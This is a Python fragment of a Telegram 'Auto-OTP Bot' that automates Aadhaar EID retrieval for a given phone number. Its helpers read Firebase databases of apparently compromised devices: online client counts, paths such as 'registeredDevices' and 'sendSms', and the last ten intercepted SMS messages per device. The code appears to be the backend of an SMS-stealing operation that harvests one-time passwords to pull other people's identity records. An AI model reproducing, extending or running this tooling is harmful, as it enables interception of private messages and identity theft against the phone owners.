        f"<b>⚡ Auto-OTP Bot</b>\n━━━━━━━━━━━━━━━\n"
        f"<b>〔 📱 {phone} 〕</b>\n"
        f"◈ Name · {name}\n"
        f"<i>◌ Starting flow...</i>",
        parse_mode='HTML')

    # Run Aadhaar flow using a fresh engine
    eng = AadhaarEngine(bot, chat_id=str(chat_id))
    try:
        # Snapshot message IDs before EID OTP
        snap1 = await asyncio.to_thread(fb_msgids, db, cid)

        # ---- Step 1: EID OTP ----
        # We bypass retrive-eid.py's interactive flow and do a minimal
        # headless OTP request via the send_eid_otp helper in the subprocess.
        # For simplicity and reliability, we use the AadhaarEngine with auto OTP.
        await eng.run_flow(chat_id, name, phone, None, user_info=None)
        return True
    except Exception as e:
        print(f"[AUTO] {phone}: {e}")
        try:
            stats_manager.record_failure()
        except:
            pass
        bot.send_message(chat_id,
            f"<b>⚡ Auto-OTP Bot</b>\n━━━━━━━━━━━━━━━\n"
            f"<b>〔 📱 {phone} ✗ 〕</b>\n"
            f"✗ {escape_html(str(e))[:200]}",
            parse_mode='HTML')
        return False
    finally:
        try:
            await eng.close()
        except:
            pass


# ==============================================================================
# 🌐 DEBUG HELPERS
# ==============================================================================
def fb_debug_scan_raw():
    """Return a report string: total + online count per DB."""
    lines = []
    with firebase_lock:
        dbs = list(firebase_dbs)
    for db in dbs:
        short = db['url'].split('//')[-1][:40]
        try:
            clients = requests_get(fb_url(db, "clients.json"), timeout=12)
            total = len(clients) if isinstance(clients, dict) else 0
            online = sum(1 for d in (clients or {}).values()
                         if isinstance(d, dict) and d.get("status") is True)
            lines.append(f"<b>DB:</b> <code>{short}</code>\n"
                         f"  ◈ total clients · {total}\n"
                         f"  ◈ online (status is True) · <b>{online}</b>")
        except Exception as e:
            lines.append(f"<b>DB:</b> <code>{short}</code>\n  ✗ {escape_html(str(e))[:120]}")
    return "\n".join(lines) if lines else "No DBs."


def fb_debug_users_paths():
    """Inspect common user-phone paths in the first DB."""
    with firebase_lock:
        dbs = list(firebase_dbs)
    if not dbs:
        return "No DBs."
    db = dbs[0]
    lines = [f"<b>DB:</b> <code>{db['url'][:50]}</code>"]
    for path in ["users", "user_data", "All_User", "All_Users",
                 "registeredDevices", "Verify_Device", "devices",
                 "panel", "bot_users", "bookings", "profex_incoming",
                 "settings", "commands", "sendSms"]:
        try:
            j = requests_get(fb_url(db, f"{path}.json"), timeout=12)
            if not j:
                lines.append(f"◈ /{path} → empty")
                continue
            if isinstance(j, dict):
                keys = list(j.keys())[:2]
                lines.append(f"◈ /{path} · <b>{len(j)}</b> keys")
                for k in keys:
                    v = j[k]
                    if isinstance(v, dict):
                        lines.append(f"   · <code>{str(k)[:20]}</code> · {', '.join(list(v.keys())[:8])}")
            elif isinstance(j, list):
                lines.append(f"◈ /{path} · list[{len(j)}]")
        except Exception as e:
            lines.append(f"◈ /{path} err: {escape_html(str(e))[:80]}")
    return "\n".join(lines)


def fb_debug_msgs(did):
    """Return last 10 messages for a device id."""
    with firebase_lock:
        dbs = list(firebase_dbs)
    if not dbs:
        return "No DBs."
    db = dbs[0]
    try:
        j = requests_get(fb_url(db, f'messages/{did}.json?orderBy=%22%24key%22&limitToLast=10'), timeout=12)
        if not j or not isinstance(j, dict):
            return f"No messages for {did}"
        out = [f"<b>📩 last 10 for {did[:14]}</b>"]
        for mid, md in sorted(j.items(), reverse=True)[:10]:
            if isinstance(md, dict):
                body = md.get("message", "") or md.get("body", "") or md.get("msg", "")
                sender = md.get("sender", "")
                out.append(f"• <b>{escape_html(sender[:20])}</b>\n  <code>{escape_html(str(body)[:180])}</code>")
        return "\n".join(out)
    except Exception as e:
        return f"Error: {e}"


# ==============================================================================
# 📥 EXISTING HELPERS (kept for backwards compat)
# ==============================================================================
async def execute_task(bot, chat_id, name, mobile, dob, user_info=None):
    str_chat_id = str(chat_id)
    if str_chat_id in active_tasks:
        bot.send_message(chat_id, "⏳ <b>Aapka task pehle se process ho raha hai.</b>", parse_mode='HTML')
        return False
    max_concurrent = stats_manager.get_max_concurrent_tasks()
    if len(active_tasks) >= max_concurrent:
        bot.send_message(chat_id, f"⚠️ <b>Bot is overloaded!</b>", parse_mode='HTML')
        return False
    active_tasks.add(str_chat_id)
    if str_chat_id in active_engines:
        engine = active_engines[str_chat_id]
    else:
        engine = AadhaarEngine(bot, chat_id=str_chat_id)
        active_engines[str_chat_id] = engine
    try:
        await engine.run_flow(chat_id, name, mobile, dob, user_info=user_info)
    except Exception as e:
        err_str = str(e)
        if "|||" in err_str:
            user_msg, real_msg = err_str.split("|||", 1)
            user_msg = user_msg.strip(); real_msg = real_msg.strip()
        else:
            user_msg = err_str; real_msg = err_str
        engine.update_status(f"❌ <b>Task Failed:</b> {escape_html(user_msg)}")
        try:
            is_user_error = any(x in user_msg.lower() for x in [
                "no record", "not found", "mismatch", "validation failed",
                "invalid captcha", "incorrect otp", "invalid otp",
                "incorrect details", "wrong captcha", "galat hain",
                "match nahi", "incorrect", "invalid"
            ])
            if not is_user_error:
                stats_manager.record_failure()
            stats_manager.log_error(chat_id, user_info, f"Task Failed: {real_msg}")
        except:
            pass
    finally:
        if str_chat_id in active_engines:
            del active_engines[str_chat_id]
        if str_chat_id in active_tasks:
            active_tasks.remove(str_chat_id)
        try:
            await engine.delete_temp_messages()
        except:
            pass
        await engine.close()
    return True


def prewarm_engine(bot, chat_id, mobile=None):
    str_chat_id = str(chat_id)
    if str_chat_id in active_engines:
        engine = active_engines[str_chat_id]
        if mobile and (not hasattr(engine, 'phase1_process') or engine.phase1_process is None):
            engine.start_early_phase1(mobile)
        return
    engine = AadhaarEngine(bot, chat_id=str_chat_id)
    active_engines[str_chat_id] = engine
    global _running_loop
    if _running_loop and _running_loop.is_running():
        if mobile:
            engine.start_early_phase1(mobile)
    else:
        try:
            loop = asyncio.get_event_loop()
        except:
            loop = asyncio.new_event_loop()
            asyncio.set_event_loop(loop)
        if mobile:
            loop.create_task(engine._early_phase1_loop(mobile))
